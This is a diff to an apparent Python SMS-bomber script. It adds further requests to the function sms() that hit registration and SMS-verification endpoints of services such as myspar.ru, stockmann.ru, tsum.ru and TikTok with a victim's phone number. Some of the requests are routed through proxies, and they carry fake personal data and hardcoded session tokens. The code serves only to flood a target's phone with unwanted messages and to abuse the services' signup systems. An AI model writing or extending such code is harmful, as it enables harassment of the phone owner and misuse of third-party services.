@@ -166,6 +166,29 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')}, proxies=proxies)
+				except:
+					pass
+
+				try:
 					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
 				except:
 					pass
@@ -246,7 +269,33 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num3=""
+					num3+=num[4]
+					num3+=num[5]
+					num3+=num[6]
+					num4=""
+					num4+=num[7]
+					num4+=num[8]
+					num5=""
+					num5+=num[9]
+					num5+=num[10]
+					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y", proxies=proxies)
+				except:
+					pass
+
+				try:
 					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
+				except:
+					pass
+
+				try:
+					payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+"+number}}}
+					requests.post("https://api.tsum.ru/authorize/request-sms", json=payload, proxies = proxies)
 				except:
 					pass
 
@@ -394,6 +443,26 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num3=""
+					num3+=num[4]
+					num3+=num[5]
+					num3+=num[6]
+					num4=""
+					num4+=num[7]
+					num4+=num[8]
+					num5=""
+					num5+=num[9]
+					num5+=num[10]
+					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y")
+				except:
+					pass
+
+				try:
 					payload = {"phone": number}
 					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload)
 				except:
@@ -452,8 +521,37 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')})
+				except:
+					pass
+
+				try:
 					payload = {"phone_number": number, "region_code": "RU"}
 					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload)
+				except:
+					pass
+
+				try:
+					payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+"+number}}}
+					requests.post("https://api.tsum.ru/authorize/request-sms", json=payload)
 				except:
 					pass
 
